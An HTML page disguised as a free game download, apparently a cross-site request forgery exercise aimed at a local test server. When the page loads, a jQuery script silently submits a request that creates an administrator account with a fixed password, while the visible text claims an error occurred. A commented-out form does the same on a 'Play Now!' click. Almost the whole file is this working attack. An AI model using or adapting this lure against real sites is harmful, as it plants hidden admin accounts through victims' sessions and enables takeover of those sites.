<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Game Free Download!</title>
</head>
    <body>

        <!-- Using a form -->

        <!--h1>Click here to Download Game!</h1>
        <form action="http://localhost:8000/add-user.php" method="POST" id="stealMoneyForm">
            <input type="hidden" name="name" value="Nasri">
            <input type="hidden" name="email" value="nasri@gmail.com">
            <input type="hidden" name="user_password" value="azerty">
            <input type="hidden" name="profile" value="admin">
        </form>
        <button onclick="document.getElementById('stealMoneyForm').submit();">
            Play Now!
        </button-->

        <!-- Using Ajax -->

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                $.ajax({
                    url: "http://localhost:8000/add-user.php",
                    type: "POST",
                    data: {
                        name: "Nasri",
                        email: "nasri@gmail.com",
                        user_password: "azerty",
                        profile: "admin"
                    },
                    success: function(response) {
                        console.log("example of success message!");
                    },
                    error: function(xhr, status, error) {
                        console.log("example of error message!");
                    }
                });
            });
        </script>
        
        Oups, an error occured in this page, come back later ...

    </body>
</html>

    